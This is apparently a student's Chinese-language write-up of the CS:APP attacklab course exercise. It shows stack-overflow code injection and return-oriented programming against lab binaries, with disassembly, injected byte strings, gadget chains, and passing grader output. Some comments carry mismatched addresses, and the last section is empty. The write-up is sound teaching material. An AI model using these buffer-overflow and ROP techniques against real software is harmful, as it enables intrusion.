

## 说明

此文件包含attacklab的一个实例的材料。

### ctarget

具有代码注入漏洞的Linux二进制文件。phase 1~3

### rtarget

具有面向返回的编程漏洞的Linux二进制文件。phase 4~5。

### cookie.txt



包含此实验室实例所需的4字节签名的文本文件。



### farm.c



此rtarget实例中存在gadget farm的源代码。你

可以编译（使用flag-Og）并反汇编它来查找gadget。

### hex2raw

生成字节序列的实用程序。见实验室文件

## Part I: Code Injection Attacks

### Level 1

```c
void test()
{
    int val; 
	val = getbuf(); 
	printf("No exploit. Getbuf returned 0x%x\n",val);
}
void touch1() 
{ 
    vlevel = 1; /* Part of validation protocol */
    printf("Touch1!: You called touch1()\n");         validate(1);
    exit(0);
}
```

```asm
0000000000401968 <test>:
  401968:	48 83 ec 08          	sub    $0x8,%rsp
  40196c:	b8 00 00 00 00       	mov    $0x0,%eax
  401971:	e8 32 fe ff ff       	callq  4017a8 <getbuf>
  401976:	89 c2                	mov    %eax,%edx
  401978:	be 88 31 40 00       	mov    $0x403188,%esi
  40197d:	bf 01 00 00 00       	mov    $0x1,%edi
  401982:	b8 00 00 00 00       	mov    $0x0,%eax
  401987:	e8 64 f4 ff ff       	callq  400df0 <__printf_chk@plt>
  40198c:	48 83 c4 08          	add    $0x8,%rsp
  401990:	c3                   	retq   
  401991:	90                   	nop
  401992:	90                   	nop
  401993:	90                   	nop
  401994:	90                   	nop
  401995:	90                   	nop
  401996:	90                   	nop
  401997:	90                   	nop
  401998:	90                   	nop
  401999:	90                   	nop
  40199a:	90                   	nop
  40199b:	90                   	nop
  40199c:	90                   	nop
  40199d:	90                   	nop
  40199e:	90                   	nop
  40199f:	90                   	nop


```

```asm

00000000004017a8 <getbuf>:
  4017a8:	48 83 ec 28          	sub    $0x28,%rsp# 5个字,40字节的buffer
  4017ac:	48 89 e7             	mov    %rsp,%rdi
  4017af:	e8 8c 02 00 00       	callq  401a40 <Gets>
  4017b4:	b8 01 00 00 00       	mov    $0x1,%eax
  4017b9:	48 83 c4 28          	add    $0x28,%rsp
  4017bd:	c3                   	retq   
  4017be:	90                   	nop
  4017bf:	90                   	nop

```

```c
char* gets(char* dest)
{
    int c=getchar();
    char* p=dest;
    while(c!=EOF&&c!='\n')
    {
        *p++=c;//priority:++(x) > *x > (x)++,*p++ means(*p)++
        c=getchar();
    }
    *p='\0';
    return dest;
}
```



```asm
00000000004017c0 <touch1>:
  4017c0:	48 83 ec 08          	sub    $0x8,%rsp
  4017c4:	c7 05 0e 2d 20 00 01 	movl   $0x1,0x202d0e(%rip)        # 6044dc <vlevel>
  4017cb:	00 00 00 
  4017ce:	bf c5 30 40 00       	mov    $0x4030c5,%edi
  4017d3:	e8 e8 f4 ff ff       	callq  400cc0 <puts@plt>
  4017d8:	bf 01 00 00 00       	mov    $0x1,%edi
  4017dd:	e8 ab 04 00 00       	callq  401c8d <validate>
  4017e2:	bf 00 00 00 00       	mov    $0x0,%edi
  4017e7:	e8 54 f6 ff ff       	callq  400e40 <exit@plt>
```

`0xc01740`

### Level 2

第2阶段将注入少量代码作为攻击字符串的一部分。在ctarget中，有一个函数touch2的代码，具有以下C表示：

```c
void touch2(unsigned val)
{
    vlevel2=2;
    if(val==cookie)
    {
        printf("Touch2!:You called touch2(0x%.8x)\n",val);
        validate(2);
    }else{
        printf("Misfire:you called touch2(0x%.8x)\n",val);
        fail(2);
    }
    exit(0);
}
```



```asm
00000000004017ec <touch2>:
  4017ec:	48 83 ec 08          	sub    $0x8,%rsp
  4017f0:	89 fa                	mov    %edi,%edx
  4017f2:	c7 05 e0 2c 20 00 02 	movl   $0x2,0x202ce0(%rip)        # 6044dc <vlevel>
  4017f9:	00 00 00 
  4017fc:	3b 3d e2 2c 20 00    	cmp    0x202ce2(%rip),%edi        # 6044e4 <cookie>
  401802:	75 20                	jne    401824 <touch2+0x38>
  401804:	be e8 30 40 00       	mov    $0x4030e8,%esi
  401809:	bf 01 00 00 00       	mov    $0x1,%edi
  40180e:	b8 00 00 00 00       	mov    $0x0,%eax
  401813:	e8 d8 f5 ff ff       	callq  400df0 <__printf_chk@plt>
  401818:	bf 02 00 00 00       	mov    $0x2,%edi
  40181d:	e8 6b 04 00 00       	callq  401c8d <validate>
  401822:	eb 1e                	jmp    401842 <touch2+0x56>
  401824:	be 10 31 40 00       	mov    $0x403110,%esi
  401829:	bf 01 00 00 00       	mov    $0x1,%edi
  40182e:	b8 00 00 00 00       	mov    $0x0,%eax
  401833:	e8 b8 f5 ff ff       	callq  400df0 <__printf_chk@plt>
  401838:	bf 02 00 00 00       	mov    $0x2,%edi
  40183d:	e8 0d 05 00 00       	callq  401d4f <fail>
  401842:	bf 00 00 00 00       	mov    $0x0,%edi
  401847:	e8 f4 f5 ff ff       	callq  400e40 <exit@plt>
```



```asm
0000000000401a40 <Gets>:
  401a40:	41 54                	push   %r12
  401a42:	55                   	push   %rbp
  401a43:	53                   	push   %rbx
  401a44:	49 89 fc             	mov    %rdi,%r12
  401a47:	c7 05 b3 36 20 00 00 	movl   $0x0,0x2036b3(%rip)        # 605104 <gets_cnt>
  401a4e:	00 00 00 
  401a51:	48 89 fb             	mov    %rdi,%rbx
  401a54:	eb 11                	jmp    401a67 <Gets+0x27>
  401a56:	48 8d 6b 01          	lea    0x1(%rbx),%rbp
  401a5a:	88 03                	mov    %al,(%rbx)
  401a5c:	0f b6 f8             	movzbl %al,%edi
  401a5f:	e8 3c ff ff ff       	callq  4019a0 <save_char>
  401a64:	48 89 eb             	mov    %rbp,%rbx
  401a67:	48 8b 3d 62 2a 20 00 	mov    0x202a62(%rip),%rdi        # 6044d0 <infile>
  401a6e:	e8 4d f3 ff ff       	callq  400dc0 <_IO_getc@plt>
  401a73:	83 f8 ff             	cmp    $0xffffffff,%eax
  401a76:	74 05                	je     401a7d <Gets+0x3d>
  401a78:	83 f8 0a             	cmp    $0xa,%eax
  401a7b:	75 d9                	jne    401a56 <Gets+0x16>
  401a7d:	c6 03 00             	movb   $0x0,(%rbx)
  401a80:	b8 00 00 00 00       	mov    $0x0,%eax
  401a85:	e8 6e ff ff ff       	callq  4019f8 <save_term>
  401a8a:	4c 89 e0             	mov    %r12,%rax
  401a8d:	5b                   	pop    %rbx
  401a8e:	5d                   	pop    %rbp
  401a8f:	41 5c                	pop    %r12
  401a91:	c3                   	retq   

```



`cookie:0x59b997fa`

`&touch2:4017ec`

要做的：

`mov (cookie) %rdi; mov &touch2 (%rsp); ret; `



```asm
# 48 c7 c7 fa 97 b9 59:mov 0x59b997fa %rdi
0x5561dc78:     0x48    0xc7    0xc7    0xfa    0x97    0xb9    0x59    0x48 
# 48 c7 44 24 00 ec 17 40 00: mov 0x4017ec (%rsp)
0x5561dc80:     0xc7    0x44    0x24    0x00    0xec    0x17    0x40    0x00
# c3:ret
0x5561dc88:     0xc3    0x37    0x38    0x39    0x30    0x31    0x32    0x33

0x5561dc90:     0x34    0x35    0x36    0x37    0x38    0x39    0x30    0x31
0x5561dc98:     0x32    0x33    0x34    0x35    0x36    0x37    0x38    0x39

# 调用Gets()的返回地址，即/x *(int*)$rsp = 0x4017b4，将其改为注入代码的地址
# 0x5561dc78，即栈顶位置
0x5561dca0:     0x78    0xdc    0x61    0x55    0x00    0x00    0x00    0x00

```

```c
Type string:Touch2!: You called touch2(0x59b997fa)
Valid solution for level 2 with target ctarget
PASS: Would have posted the following:
        user id bovik
        course  15213-f15
        lab     attacklab
        result  1:PASS:0xffffffff:ctarget:2:48 C7 C7 FA 97 B9 59 48 C7 44 24 00 EC 17 40 00 C3 37 38 39 30 31 32 33 34 35 36 37 38 39 30 31 32 33 34 35 36 37 38 39 78 DC 61 55 00 00 00 00
[Inferior 1 (process 923) exited normally]
```



### Level 3

第3阶段还涉及代码注入攻击，但传递一个字符串作为参数。在ctarget中，函数hexmatch和touch3的代码具有以下C表示：



```c
/* Compare string to hex representation of unsigned value */
int hexmatch(unsigned val, char *sval)
{
    char cbuf[110];
    //Make position of check string unpredictable
    char *s=cbuf+random()%100;
    //0x59b997fa -> '5''9''b''9''9''7''f''a'4个byte变成了8个byte
    sprintf(s,"%.8x",val);//把16进制的每一个字符转成了对应的ascii码，8个char
    return strncmp(sval,s,9)==0;
} 
```



```c
void touch3(char* sval)
{
    vlevel=3;
    if(hexmatch(cookie,sval))
    {
         printf("Touch3!: You called touch3(\"%s\")\n", sval); 
        validate(3);
    }else{
         printf("Misfire: You called touch3(\"%s\")\n", sval); 
        fail(3);
    }
    exit(0);
}

```



```asm
00000000004018fa <touch3>:
  4018fa:	53                   	push   %rbx
  4018fb:	48 89 fb             	mov    %rdi,%rbx
  4018fe:	c7 05 d4 2b 20 00 03 	movl   $0x3,0x202bd4(%rip)        # 6044dc <vlevel>
  401905:	00 00 00 
  401908:	48 89 fe             	mov    %rdi,%rsi
  40190b:	8b 3d d3 2b 20 00    	mov    0x202bd3(%rip),%edi        # 6044e4 <cookie>
  # rsi=输入值,rdi=cookie地址
  401911:	e8 36 ff ff ff       	callq  40184c <hexmatch>
  401916:	85 c0                	test   %eax,%eax # &
  401918:	74 23                	je     40193d <touch3+0x43>
  40191a:	48 89 da             	mov    %rbx,%rdx
  40191d:	be 38 31 40 00       	mov    $0x403138,%esi
  401922:	bf 01 00 00 00       	mov    $0x1,%edi
  401927:	b8 00 00 00 00       	mov    $0x0,%eax
  40192c:	e8 bf f4 ff ff       	callq  400df0 <__printf_chk@plt>
  401931:	bf 03 00 00 00       	mov    $0x3,%edi
  401936:	e8 52 03 00 00       	callq  401c8d <validate>
  40193b:	eb 21                	jmp    40195e <touch3+0x64>
  40193d:	48 89 da             	mov    %rbx,%rdx
  401940:	be 60 31 40 00       	mov    $0x403160,%esi
  401945:	bf 01 00 00 00       	mov    $0x1,%edi
  40194a:	b8 00 00 00 00       	mov    $0x0,%eax
  40194f:	e8 9c f4 ff ff       	callq  400df0 <__printf_chk@plt>
  401954:	bf 03 00 00 00       	mov    $0x3,%edi
  401959:	e8 f1 03 00 00       	callq  401d4f <fail>
  40195e:	bf 00 00 00 00       	mov    $0x0,%edi
  401963:	e8 d8 f4 ff ff       	callq  400e40 <exit@plt>
```



```asm
000000000040184c <hexmatch>:
  40184c:	41 54                	push   %r12
  40184e:	55                   	push   %rbp
  40184f:	53                   	push   %rbx
  401850:	48 83 c4 80          	add    $0xffffffffffffff80,%rsp
  401854:	41 89 fc             	mov    %edi,%r12d
  401857:	48 89 f5             	mov    %rsi,%rbp
  40185a:	64 48 8b 04 25 28 00 	mov    %fs:0x28,%rax
  401861:	00 00 
  401863:	48 89 44 24 78       	mov    %rax,0x78(%rsp)
  401868:	31 c0                	xor    %eax,%eax
  40186a:	e8 41 f5 ff ff       	callq  400db0 <random@plt>
  40186f:	48 89 c1             	mov    %rax,%rcx
  401872:	48 ba 0b d7 a3 70 3d 	movabs $0xa3d70a3d70a3d70b,%rdx
  401879:	0a d7 a3 
  40187c:	48 f7 ea             	imul   %rdx
  40187f:	48 01 ca             	add    %rcx,%rdx
  401882:	48 c1 fa 06          	sar    $0x6,%rdx
  401886:	48 89 c8             	mov    %rcx,%rax
  401889:	48 c1 f8 3f          	sar    $0x3f,%rax
  40188d:	48 29 c2             	sub    %rax,%rdx
  401890:	48 8d 04 92          	lea    (%rdx,%rdx,4),%rax
  401894:	48 8d 04 80          	lea    (%rax,%rax,4),%rax
  401898:	48 c1 e0 02          	shl    $0x2,%rax
  40189c:	48 29 c1             	sub    %rax,%rcx
  40189f:	48 8d 1c 0c          	lea    (%rsp,%rcx,1),%rbx
  4018a3:	45 89 e0             	mov    %r12d,%r8d
  4018a6:	b9 e2 30 40 00       	mov    $0x4030e2,%ecx
  4018ab:	48 c7 c2 ff ff ff ff 	mov    $0xffffffffffffffff,%rdx
  4018b2:	be 01 00 00 00       	mov    $0x1,%esi
  4018b7:	48 89 df             	mov    %rbx,%rdi
  4018ba:	b8 00 00 00 00       	mov    $0x0,%eax
  4018bf:	e8 ac f5 ff ff       	callq  400e70 <__sprintf_chk@plt>
  4018c4:	ba 09 00 00 00       	mov    $0x9,%edx
  4018c9:	48 89 de             	mov    %rbx,%rsi
  4018cc:	48 89 ef             	mov    %rbp,%rdi
  # &sval,s,9
  4018cf:	e8 cc f3 ff ff       	callq  400ca0 <strncmp@plt>
  4018d4:	85 c0                	test   %eax,%eax
  4018d6:	0f 94 c0             	sete   %al
  4018d9:	0f b6 c0             	movzbl %al,%eax
  4018dc:	48 8b 74 24 78       	mov    0x78(%rsp),%rsi
  4018e1:	64 48 33 34 25 28 00 	xor    %fs:0x28,%rsi
  4018e8:	00 00 
  4018ea:	74 05                	je     4018f1 <hexmatch+0xa5>
  4018ec:	e8 ef f3 ff ff       	callq  400ce0 <__stack_chk_fail@plt>
  4018f1:	48 83 ec 80          	sub    $0xffffffffffffff80,%rsp
  4018f5:	5b                   	pop    %rbx
  4018f6:	5d                   	pop    %rbp
  4018f7:	41 5c                	pop    %r12
  4018f9:	c3                   	retq   

```

> 当函数hexmatch和strncmp被调用时，它们会将数据push到栈上，覆盖存储getbuf使用的部分缓冲区内存。因此,小心放置cookie字符串的位置。

`touch3:0x4018fa`

> 注入的代码应将寄存器%rdi设置为此字符串的地址

要做的：

`mov (char* sval) %rdi; mov &touch3 (%rsp); ret; `

满足`*sval==*(cbuf+random()%100)`

`val=cookie`

`*(6044e4)==cookie`



进入strncmp之前：

```asm
1: /x $rdi = 0x6044e4
2: /x $rsi = 0x5561dc1b
```





```asm
# 48 c7 c7 e4 44 60 00:mov $0x5561dc1b %rdi
0x5561dc78:     0x48    0xc7    0xc7    0x1b    0xdc    0x61    0x55    0x48 
# 48 c7 44 24 00 ec 17 40 00: mov 0x4018fa (%rsp)
0x5561dc80:     0xc7    0x44    0x24    0x00    0xfa    0x18    0x40    0x00
# c3:ret
0x5561dc88:     0xc3    0x37    0x38    0x39    0x30    0x31    0x32    0x33

0x5561dc90:     0x34    0x35    0x36    0x37    0x38    0x39    0x30    0x31
0x5561dc98:     0x48    0xc7    0xc7    0x00    0x00    0x00    0x00    0x90

# 调用Gets()的返回地址，即/x *(int*)$rsp = 0x4017b4，将其改为注入代码的地址
# 0x5561dc78，即栈顶位置
0x5561dca0:     0x78    0xdc    0x61    0x55    0x00    0x00    0x00    0x00
```



```asm
(gdb) x/20cb 0x6044e4
0x6044e4 <cookie>:      -6 '\372'       -105 '\227'     -71 '\271'      89 'Y' 
(gdb) x/20xb 0x6044e4
0x6044e4 <cookie>:      0xfa    0x97    0xb9    0x59    0x00    0x00    0x00 
(gdb) x/20tb 0x6044e4
0x6044e4 <cookie>:    11111010        10010111        10111001       01011001
```

`注意：ascii码是有符号的，0xfa==-6=='\271'(八进制)`



```asm
Type string:Misfire: You called touch3("���Y")
# "\372\227\271Y"
FAIL: Would have posted the following:
        user id bovik
        course  15213-f15
        lab     attacklab
        result  1:FAIL:0xffffffff:ctarget:3:48 C7 C7 E4 44 60 00 48 C7 44 24 00 FA 18 40 00 C3 37 38 39 30 31 32 33 34 35 36 37 38 39 30 31 48 C7 C7 00 00 00 00 90 78 DC 61 55 00 00 00 00
```



```asm
Type string:Touch3!: You called touch3("59b997fa")
Valid solution for level 3 with target ctarget
PASS: Would have posted the following:
        user id bovik
        course  15213-f15
        lab     attacklab
        result  1:PASS:0xffffffff:ctarget:3:48 C7 C7 1B DC 61 55 48 C7 44 24 00 FA 18 40 00 C3 37 38 39 30 31 32 33 34 35 36 37 38 39 30 31 48 C7 C7 00 00 00 00 90 78 DC 61 55 00 00 00 00
```





## Part II: Return-Oriented Programming

对程序RTARGET执行代码注入攻击比对CTARGET执行代码注入攻击困难得多，因为它使用两种技术来阻止此类攻击：

+ 它使用随机化，以便栈位置在一次运行到另一次运行时不同。这使得无法确定注入代码的位置
+ 它将保存栈的内存段标记为不可执行，因此即使您可以将程序计数器设置为注入代码的开头，程序也会因段错误而失败。              

幸运的是，聪明的人设计了一些策略，通过执行现有代码而不是注入新代码，在程序中完成有用的事情。Return-oriented programming（ROP）。ROP的策略是通过由一个或多个指令和指令ret组成的现有程序中的序列。

`gadget`

![img](https://github.com/Qasak/all-about-csapp-labs/blob/master/attacklab/gadget.png)

在图中，堆栈包含一系列gadget地址。每个gadget由一系列指令字节组成，最后一个字节是0xc3，编码ret指令。当程序执行从该配置开始的ret指令时，它将启动一个gadget执行链，每个gadget的末尾都有ret指令，导致程序跳转到下一个gadget的开头。

gadget可以利用编译器生成的汇编语言语句对应的代码，特别是函数末尾的语句。实际上，这种形式可能有一些有用的gadget，但不足以实现许多重要的操作。例如，编译后的函数不太可能将popq%rdi作为ret之前的最后一条指令。幸运的是，使用面向字节的指令集（如x86-64），通常可以通过从指令字节序列的其他部分提取模式来找到gadget。

```c
void setval_210(unsigned *p)
{
    *p=3347663060U;
}
```



```asm
0000000000400f15 <setval_210>: 
	400f15: c7 07 d4 48 89 c7 			movl $0xc78948d4,(%rdi) 
	400f1b: c3 						   retq
```

字节序列48 89 c7对指令movq%rax,%rdi进行编码。（下图）这个序列后面跟着字节值c3，它对ret指令进行编码。函数从地址0x400f15开始，序列从函数的第四个字节开始。因此，此代码包含一个起始地址为0x400f18的gadget，它将把寄存器%rax中的64位值复制到寄存器%rdi。



您的RTARGET代码包含许多类似于上面所示的setval_210的函数，我们称之为gadget farm。您的工作将是识别gadget farm中有用的gadget，并使用这些gadget执行与在phase2和phase3中执行的攻击相似的攻击。

### level 2

对于phse4，您将重复phase2的攻击，但请使用gadget farm中的gadget对程序RTARGET执行此操作。您可以使用由以下指令类型组成的gadget构造解决方案，并且只使用前八个x86-64寄存器（%rax–%rdi）。

movq：

![img](https://github.com/Qasak/all-about-csapp-labs/blob/master/attacklab/movq_instructions.png)

popq：

![img](https://github.com/Qasak/all-about-csapp-labs/blob/master/attacklab/popq_instructions.png)

ret：0x3c 

nop：0x90,的唯一作用是使程序计数器递增1。



要做的：

`mov (cookie) %rdi; mov &touch2 (%rsp); ret; `

->

`mov %rsp %rdi;pop rdi;ret`

`rsp->rax;pop rax;rax->rdi: (48 89 e0 -> 48 89 c7)`

```asm
# mov rsp rax
0000000000401a03 <addval_190>:
  401a03:	8d 87 41 48 89 e0    	lea    -0x1f76b7bf(%rdi),%eax
  401a09:	c3                   	retq   
# pop rax
00000000004019a7 <addval_219>:
  4019a7:	8d 87 51 73 58 90    	lea    -0x6fa78caf(%rdi),%eax
  4019ad:	c3                   	retq   

# mov rax rdi
00000000004019c3 <setval_426>:
  4019c3:	c7 07 48 89 c7 90    	movl   $0x90c78948,(%rdi)
  4019c9:	c3                   	retq   
```



```asm
root@debian:~/attklab/target1# ./rtarget -q < solve-raw.txt
Cookie: 0x59b997fa
Type string:Touch2!: You called touch2(0x59b997fa)
Valid solution for level 2 with target rtarget
PASS: Would have posted the following:
        user id bovik
        course  15213-f15
        lab     attacklab
        result  1:PASS:0xffffffff:rtarget:2:48 C7 C7 E4 44 60 00 48 C7 44 24 00 FA 18 40 00 C3 37 38 39 30 31 32 33 34 35 36 37 38 39 30 31 48 C7 C7 00 00 00 00 90 AB 19 40 00 00 00 00 00 FA 97 B9 59 00 00 00 00 C5 19 40 00 00 00 00 00 EC 17 40 00 00 00 00 00
```





### level3



